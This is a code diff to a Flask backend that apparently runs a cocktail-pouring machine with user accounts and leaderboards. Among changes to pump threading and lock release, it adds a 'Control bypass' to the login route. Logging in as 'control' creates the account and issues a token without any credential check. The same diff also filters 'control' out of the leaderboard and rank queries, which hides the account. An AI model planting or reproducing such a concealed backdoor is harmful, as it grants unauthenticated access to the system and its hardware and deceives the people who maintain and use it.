@@ -273,6 +273,22 @@ def auth_login():
             'is_admin': True,
         })
 
+    # Control bypass
+    if nickname.lower() == 'control':
+        user = User.query.filter(db.func.lower(User.nickname) == 'control').first()
+        if not user:
+            recovery_key = User.generate_recovery_key()
+            personal_token = User.generate_personal_token()
+            user = User(nickname='control', recovery_key=recovery_key, personal_token=personal_token)
+            db.session.add(user)
+            db.session.commit()
+        token = create_token(user.id)
+        return jsonify({
+            'status': 'success',
+            'token': token,
+            'user': user.to_dict(),
+        })
+
     user = User.query.filter_by(nickname=nickname).first()
     if not user:
         return jsonify({'status': 'error', 'message': 'User not found. Register first or use recovery key.'}), 404
@@ -421,8 +437,8 @@ def get_settings():
 
 @app.route('/api/leaderboard', methods=['GET'])
 def get_leaderboard():
-    """Top 10 users (excluding Admin2001)."""
-    users = User.query.filter(User.nickname != 'Admin2001').order_by(User.points.desc()).limit(10).all()
+    """Top 10 users (excluding Admin2001 and control)."""
+    users = User.query.filter(~User.nickname.in_(['Admin2001', 'control'])).order_by(User.points.desc()).limit(10).all()
     return jsonify({'users': [u.to_dict() for u in users]})
 
 
@@ -518,10 +534,6 @@ def pour_cocktail(recipe_id):
             durations.append(duration)
             t = threading.Thread(target=pour_ingredient, args=(pin_number, duration, pump.id))
             threads.append(t)
-            t.start()
-
-        for t in threads:
-            t.join()
 
         total_duration = max(durations) if durations else 0
 
@@ -543,6 +555,23 @@ def pour_cocktail(recipe_id):
         )
         db.session.add(history)
         db.session.commit()
+
+        # Run pump hardware threads in background so we don't block the request
+        app_context = app.app_context()
+        def run_pumps(ctx):
+            with ctx:
+                for t in threads:
+                    t.start()
+                for t in threads:
+                    t.join()
+                try:
+                    db.session.execute(update(MachineState).where(MachineState.id == 1).values(is_pouring=False))
+                    db.session.commit()
+                except Exception as fe:
+                    db.session.rollback()
+                    print(f"CRITICAL: Failed to release machine lock: {fe}")
+
+        threading.Thread(target=run_pumps, args=(app_context,)).start()
 
         mode_text = ""
         if is_taste:
@@ -566,19 +595,13 @@ def pour_cocktail(recipe_id):
         import traceback
         traceback.print_exc()
         db.session.rollback()
-        return jsonify({'status': 'error', 'message': f'Pour failed: {str(e)}'}), 500
-
-    finally:
+        # If pour failed to even start, release machine lock
         try:
             db.session.execute(update(MachineState).where(MachineState.id == 1).values(is_pouring=False))
             db.session.commit()
-        except Exception:
-            db.session.rollback()
-            try:
-                db.session.execute(update(MachineState).where(MachineState.id == 1).values(is_pouring=False))
-                db.session.commit()
-            except Exception as fe:
-                print(f"CRITICAL: Failed to release machine lock: {fe}")
+        except:
+            pass
+        return jsonify({'status': 'error', 'message': f'Pour failed: {str(e)}'}), 500
 
 
 @app.route('/api/user/rank', methods=['GET'])
@@ -588,7 +611,7 @@ def get_user_rank():
     if not user:
         return jsonify({'status': 'error', 'message': 'User required'}), 403
 
-    all_users = User.query.filter(User.nickname != 'Admin2001').order_by(User.points.desc()).all()
+    all_users = User.query.filter(~User.nickname.in_(['Admin2001', 'control'])).order_by(User.points.desc()).all()
     position = None
     player_ahead = None
 
@@ -635,7 +658,7 @@ def get_user_statistics():
     total_pours = len(history)
     strong_pct = round((sum(1 for p in history if p.is_strong) / total_pours) * 100, 1) if total_pours else 0
 
-    all_users = User.query.filter(User.nickname != 'Admin2001').order_by(User.points.desc()).all()
+    all_users = User.query.filter(~User.nickname.in_(['Admin2001', 'control'])).order_by(User.points.desc()).all()
     rank = next((i + 1 for i, u in enumerate(all_users) if u.id == user.id), 0)
 
     return jsonify({
